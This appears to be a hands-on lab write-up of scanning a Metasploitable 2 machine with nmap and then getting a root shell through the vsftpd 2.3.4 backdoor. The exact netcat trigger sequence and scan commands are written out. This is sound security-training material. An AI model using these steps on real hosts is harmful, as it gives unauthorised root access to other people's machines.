## **Tools Used**

- **Nmap**: Network discovery and port scanning
- **Netcat**: Network utility for reading/writing network connections
- **vsFTPd 2.3.4 Exploit**: Backdoor vulnerability exploitation

Vulnerabilities Identified
vsFTPd 2.3.4 Backdoor: Critical vulnerability allowing root access

Multiple Exposed Services: Unnecessary services running

Outdated Software: Older versions with known vulnerabilities

Anonymous FTP Access: Unauthenticated file access


**Find and Scan the Target:**

**Step 1: To Findmy own IP Address**

1. I Start **Kali Linux.**
2. Open a terminal.
3. Type this command to find own IP and the network range:

                    ***ip a***

IP i found; 192.168.1.5

**Step 2: Discover the Metasploitable Machine**

Now, i scan the network to find the target. Use the network range found;

            nmap -sn 192.168.1.0/24
I see a list of IPs that responded. One is your Kali machine. The other is your **Metasploitable 2** machine, i also found 3 others.

   ***Kali IP: 192.168.1.5***

   ***Metasploitable2 IP: 192.168.1.4***

****Step 3: Scan the Target's Open Ports**
Now, i scan my target IP just found, the command i use;

              ***nmap -sV -A 192.168.1.4***

**Step 4: See the Web Service**

I Open the Firefox browser in Kali.

In the address bar, type: `http://`192.168.1.4

Website shown, Successfully scanned a network and accessed a service.

Found following open ports;

- **21/tcp - FTP:** `vsftpd 2.3.4` - This version is **exploitable**. It has a famous backdoor.
- **22/tcp - SSH:** `OpenSSH 4.7p1` - Old version, may have vulnerabilities.
- **23/tcp - Telnet:** Unencrypted remote login. You can try to log in.
- **80/tcp - HTTP:** A website (you already saw it).
- **445/tcp - Samba:** File sharing service. The scan says `message_signing: disabled (dangerous, but default)` - this is a huge finding.
- **1524/tcp - bindshell:** This is literally a backdoor left open. The name says it all.
- **2121/tcp - FTP:** Another FTP service (`ProFTPD 1.3.1`), also with known vulnerabilities.
- **3306/tcp - MySQL:** Database port. Default credentials might work.
- **5432/tcp - PostgreSQL:** Another database.
- **6667/tcp - IRC:** `UnrealIRCd` - This version has a famous backdoor.

**vsftpd 2.3.4 is famous backdoor which is exploitable.**

**Choose Attack:**

I choose **vsftpd 2.3.4** backdoor for exploitation in network reconnaissance.

In your Kali terminal, connect to the FTP port (21 port) with a specific command:

                             ***nc 192.168.1.4 21***  

Then I type this,  `user hello:)`

Type: `pass world`

**This triggers the backdoor.** Now, open a **NEW terminal** in my Kali.

In the new terminal, connect to the backdoor on port 6200 & used this command;

                                     ***nc 192.168.1.4 6200***

And i got a root shell (`root@metasploitable:`). C**ompromised the entire machine.** Type `whoami` to see.

then type; ***ls***

It shows all the folders inside compromised device.

Also i attched all the screenshot of real time lab.

Disclaimer
This documentation is for educational purposes only. The techniques demonstrated should only be used on systems you own or have explicit permission to test.
